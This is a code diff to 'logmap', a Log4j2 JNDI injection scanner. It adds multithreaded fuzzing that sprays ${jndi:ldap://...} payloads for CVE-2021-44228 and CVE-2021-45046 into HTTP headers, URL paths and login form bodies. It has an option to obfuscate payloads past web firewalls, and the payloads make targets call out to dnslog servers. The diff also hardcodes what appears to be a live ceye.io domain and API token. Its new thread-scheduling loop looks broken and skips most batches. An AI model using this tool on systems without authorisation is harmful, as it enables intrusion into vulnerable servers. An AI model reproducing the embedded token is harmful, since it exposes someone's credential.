@@ -21,6 +21,7 @@ import textwrap
 import socks
 import urllib3
 import platform
+import threading
 from random import getrandbits
 from urllib.parse import urlparse
 
@@ -75,7 +76,7 @@ def arg():
     gen.add_argument("-d", "--dns", dest="dns", metavar="1", type=int, default=1,
                      help="Dnslog [1:log.xn--9tr.com, 2:ceye.io] default 1")
     gen.add_argument("-p", dest="payload", help="Custom payload (e.g. ${jndi:ldap://xx.dns.xx/} ) ")
-    gen.add_argument("-t", dest="timeout", metavar="10", default=10, help="Http timeout default 10s")
+    gen.add_argument("-t", dest="timeout", metavar="20", default=20, help="Http timeout default 20s")
     gen.add_argument("-o", dest="output", metavar="file", help="Output file")
     gen.add_argument("-w", "--waf", dest="waf", action='store_true', help="Obfuscate the payload and bypass waf")
     gen.add_argument("--proxy", dest="proxy", help="Proxy [socks5/socks4/http] (e.g. http://127.0.0.1:8080)")
@@ -152,7 +153,64 @@ def confuse_payload(chars):
     return ''.join([str(s) for s in lst])
 
 
+def fuzz_headers(threads, lock, target, domain, timeout, headers, result_md5_req, md5, key, value):
+    dns_domain = md5 + "." + domain
+    value = value.replace("DNS_LOG_DOMAIN", dns_domain)
+    if args.waf:
+        value = confuse_payload(value)
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+        key: value
+    }
+    try:
+        logger("green", "[*] Fuzz headers: {}".format(key))
+        req = requests.get(target, timeout=timeout, headers=headers, verify=False)
+        result_md5_req[md5] = print_roundtrip(req)
+    except:
+        logger("green_b", "[?] Fuzz headers: {} abnormal".format(key))
+        result_md5_req[md5] = "********************** payload **********************\n\n" \
+                              "{}: {}\n\n" \
+                              "*****************************************************".format(key, value)
+
+
+def fuzz_path(threads, lock, target, domain, timeout, headers, result_md5_req, md5, key_path, value_path):
+    dns_domain = md5 + "." + domain
+    value_path = value_path.replace("DNS_LOG_DOMAIN", dns_domain)
+    if args.waf:
+        value_path = confuse_payload(value_path)
+    path_p = key_path + value_path
+    try:
+        logger("green", "[*] Fuzz url path: {}".format(path_p))
+        req = requests.get(target + path_p, timeout=timeout, headers=headers, verify=False)
+        result_md5_req[md5] = print_roundtrip(req)
+    except:
+        result_md5_req[md5] = "********************** payload **********************\n\n" \
+                              "{}\n\n" \
+                              "*****************************************************".format(path_p)
+        logger("green_b", "[?] Fuzz url path: {} abnormal".format(path_p))
+        result_md5_req[md5] = "payload: {}".format(path_p)
+
+
+def fuzz_body(threads, lock, target, domain, timeout, headers, result_md5_req, md5, key_body, payload):
+    dns_domain = md5 + "." + domain
+    payload_body = payload.replace("DNS_LOG_DOMAIN", dns_domain)
+    if args.waf:
+        payload_body = confuse_payload(key_body.replace("DNS_LOG_DOMAIN", dns_domain))
+    body = key_body.replace("RE_PAYLOAD", payload_body)
+    try:
+        logger("green", "[*] Fuzz body: {}".format(body))
+        req = requests.post(target, data=body, timeout=timeout, headers=headers, verify=False)
+        result_md5_req[md5] = print_roundtrip(req)
+    except:
+        logger("green_b", "[?] Fuzz body: {} abnormal".format(body))
+        result_md5_req[md5] = "********************** payload **********************\n\n" \
+                              "{}\n\n" \
+                              "*****************************************************".format(body)
+
+
 def run_fuzz(target, payload, timeout, domain, token):
+    lock = threading.Lock()
     path_payload_list = {
         "": "",
         "/hello": payload,
@@ -160,7 +218,7 @@ def run_fuzz(target, payload, timeout, domain, token):
         "?username=": payload,
         "?page=": payload,
     }
-    headers = {
+    headers= {
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
     }
@@ -259,79 +317,44 @@ def run_fuzz(target, payload, timeout, domain, token):
         "X-WAP-Profile": payload,
         "X-XSRF-TOKEN": payload,
     }
-
-    body_payload_lists = {
-        'payload=': payload,
-        'user=': payload,
-        'pass=': payload,
-        'username=': payload,
-        'password=': payload,
-        'j_username=': payload,
-        'j_password=': payload,
-        'login=': payload,
-        'email=': payload,
-        'principal=': payload,
-        'token=': payload,
-        'verify=': payload,
-        'dest=': payload,
-    }
+    body_payload_lists = [
+        'payload=RE_PAYLOAD',
+        'user=RE_PAYLOAD',
+        'pass=RE_PAYLOAD',
+        'username=RE_PAYLOAD',
+        'password=RE_PAYLOAD',
+        'login=RE_PAYLOAD',
+        'email=RE_PAYLOAD',
+        'principal=RE_PAYLOAD',
+        'token=RE_PAYLOAD',
+        'verify=RE_PAYLOAD',
+        'dest=RE_PAYLOAD',
+        'login_username=RE_PAYLOAD',
+        'login_password=RE_PAYLOAD',
+        'authorization=RE_PAYLOAD',
+        'city=RE_PAYLOAD',
+        'user=RE_PAYLOAD&pass=RE_PAYLOAD',
+        'username=RE_PAYLOAD&password=RE_PAYLOAD',
+        'USERNAME=RE_PAYLOAD&PASSWORD=RE_PAYLOAD',
+        'j_username=RE_PAYLOAD&j_password=RE_PAYLOAD',
+    ]
     result_md5_req = {}
-    for (key, value) in headers_payload_lists.items():
-        ua = ""
-        if key == "User-Agent":
-            ua = headers[key]
-        md5 = random_md5()
-        dns_domain = md5 + "." + domain
-        logger("green", "[*] Fuzz headers: {}".format(key))
-        value = value.replace("DNS_LOG_DOMAIN", dns_domain)
-        if args.waf:
-            value = confuse_payload(value)
-        headers[key] = value
-        try:
-            req = requests.get(target, timeout=timeout, headers=headers, verify=False)
-            result_md5_req[md5] = print_roundtrip(req)
-        except:
-            logger("green_b", "[?] Fuzz headers: {} abnormal".format(key))
-            result_md5_req[md5] = "********************** payload **********************\n\n" \
-                                  "{}: {}\n\n" \
-                                  "*****************************************************".format(key, value)
-        del headers[key]
-        if key == "User-Agent":
-            headers[key] = ua
+    threads = []
+    threads.append([threading.Thread(target=fuzz_headers, args=(threads, lock, target, domain, timeout, headers, result_md5_req, random_md5(), key, value)) for (key, value) in headers_payload_lists.items()])
     for (key_path, value_path) in path_payload_list.items():
-        if "=" not in key_path:
-            for (key_body, value_body) in body_payload_lists.items():
-                md5 = random_md5()
-                dns_domain = md5 + "." + domain
-                value_body = value_body.replace("DNS_LOG_DOMAIN", dns_domain)
-                if args.waf:
-                    value_body = confuse_payload(value_body)
-                body = key_body + value_body
-                logger("green", "[*] Fuzz body: {}".format(body))
-                try:
-                    req = requests.post(target + key_path, data=body, timeout=timeout, headers=headers, verify=False)
-                    result_md5_req[md5] = print_roundtrip(req)
-                except:
-                    logger("green_b", "[?] Fuzz body: {} abnormal".format(body))
-                    result_md5_req[md5] = "********************** payload **********************\n\n" \
-                                          "{}\n\n" \
-                                          "*****************************************************".format(body)
-        md5 = random_md5()
-        dns_domain = md5 + "." + domain
-        value_path = value_path.replace("DNS_LOG_DOMAIN", dns_domain)
-        if args.waf:
-            value_path = confuse_payload(value_path)
-        path_p = key_path + value_path
-        logger("green", "[*] Fuzz url path: {}".format(path_p))
-        try:
-            req = requests.get(target + path_p, timeout=timeout, headers=headers, verify=False)
-            result_md5_req[md5] = print_roundtrip(req)
-        except:
-            result_md5_req[md5] = "********************** payload **********************\n\n" \
-                                  "{}\n\n" \
-                                  "*****************************************************".format(path_p)
-            logger("green_b", "[?] Fuzz url path: {} abnormal".format(path_p))
-            result_md5_req[md5] = "payload: {}".format(path_p)
+        if key_path == "":
+            threads.append([threading.Thread(target=fuzz_body, args=(threads, lock, target, domain, timeout, headers, result_md5_req, random_md5(), key_body, payload)) for key_body in body_payload_lists])
+        threads.append(threading.Thread(target=fuzz_path, args=(threads, lock, target, domain, timeout, headers, result_md5_req, random_md5(), key_path, value_path)))
+    i = 0
+    for t in threads:
+        i += 1
+        if i == 3:
+            break
+        for o in t:
+            o.start()
+        for o in t:
+            o.join()
+
     if args.payload:
         logger("yellow", "[*] Please check your dns")
     else:
@@ -353,12 +376,12 @@ def check_log4j2(args):
     if args.payload:
         payload = args.payload
     elif args.cve == 1:
-        payload = "${{jndi:ldap://{0}/{1}}}".format("DNS_LOG_DOMAIN", random_str())
+        payload = "${{jndi:ldap://{0}:443/{1}}}".format("DNS_LOG_DOMAIN", random_str())
         logger("yellow",
                "[+] Use CVE-2021-44228 paylaod: {}"
                .format(payload.replace("DNS_LOG_DOMAIN", "md5." + domain)))
     else:
-        payload = "${{jndi:ldap://127.0.0.1#{0}/{1}}}".format("DNS_LOG_DOMAIN", random_str())
+        payload = "${{jndi:ldap://127.0.0.1#{0}:443/{1}}}".format("DNS_LOG_DOMAIN", random_str())
         logger("yellow",
                "[+] Use CVE-2021-45046 paylaod: {}"
                .format(payload.replace("DNS_LOG_DOMAIN", "md5." + domain)))
@@ -457,9 +480,10 @@ def proxy(args):
 if __name__ == '__main__':
     banners()
     logger("blue", "[*] Log4j2 jndi injection fuzz tool")
-    logger("blue", "[*] Version: 0.4")
+    logger("blue", "[*] Version: 0.6")
     logger("blue", "[*] From https://github.com/zhzyker/logmap")
     args = arg()
     args.ceye = ["xxxxxx.ceye.io", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
+    args.ceye = ["7m7tgh.ceye.io", "843fd6d58a8ebede756a2b991d321a5a"]
     proxy(args)
     check_log4j2(args)
